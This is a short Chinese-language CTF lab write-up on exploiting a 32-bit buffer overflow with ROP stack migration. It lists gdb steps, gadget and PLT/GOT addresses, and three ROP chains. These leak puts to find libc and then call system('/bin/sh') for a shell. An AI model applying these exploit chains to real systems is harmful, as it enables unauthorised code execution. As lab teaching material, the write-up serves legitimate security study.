# Lab6 Migration

## 先備知識

## ROP Migration

## Solve

1. 先用`gdb$ checksec`查看 → Full RELRO ⇒ .got和.plt.got都唯讀，無法GOT hijacking
2. 找BOF return offset → 44，並還有16個bytes ( 4 gadget )可以輸入
    - pattc 10 0
    - crashof
3. 找buffer1 address  ( buffer2 address 就是 buffer1 + 0x100 )
    - `gdb$ readelf` → .data = 0x804a000、.bss = 0x804a00c
    - `gdb$ vmmap` 找 .bss的end address → 0x0804b000
    - `gdb$ x/30gx 0x0804b000-0x200` → 0x804ae00
4. `gdb$ elfsymbol` 找 read@plt address (因為第一次執行石要把第二段ROP chain讀進去)→ 0x8048380
5. `gdb$ elfsymbol` 找 puts@plt address (因為等等要leak時需要) → 0x8048390
6. 第一段 ROP 讓他可以read buf
    1. `gdb$ rop` 找 leave ; ret → 0x08048418 : leave ; ret
    2. read參數 → ebx = 0, ecx = buf, edx = 100 (要讀的長度)

    ⇒ `flat([buf, read_plt, leave_ret, 0, buf, 100])`

7. 第二段 ROP 取得put offset去推libc address
    1. `gdb$ rop` 找 pop 一個 register ; ret 的 → 0x0804836d : pop ebx ; ret
    2. `gdb$ got` 找 puts的got offset → 0x08049ff0 

    ⇒ flat([buf2, put_plt, pop1ret, put_got, read_plt, leave_ret, 0, buf2, 100])

8. 將put丟出來的put offset接收起來，並轉換成數字 → 0xf75a7ca0
※可以用 `x/i 0xf75a7ca0` 檢查 → 0xf75a7ca0 <_IO_puts>
9. 利用上面得到的put offset可以得到libc的位置
※用vmmap可以檢查是否正確
10. 第三段 ROP
    1. 用 `gdb$ off system` 取得system offset再加上libc address後就是system address

    ⇒ flat([buf,system,0,buf2+4*4,"/bin/sh"])
